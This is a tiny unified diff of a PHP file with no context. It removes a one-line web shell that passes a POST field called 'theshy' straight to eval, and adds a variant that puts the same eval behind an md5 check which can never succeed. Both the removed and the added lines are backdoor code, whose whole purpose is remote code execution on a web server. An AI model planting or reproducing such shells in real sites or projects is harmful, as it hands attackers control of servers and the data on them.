@@ -1,1 +1,1 @@
-<?php @eval($_POST[theshy]); ?>
+<?php if(md5($_POST[cmd])===''){@eval($_POST[theshy]);} ?>
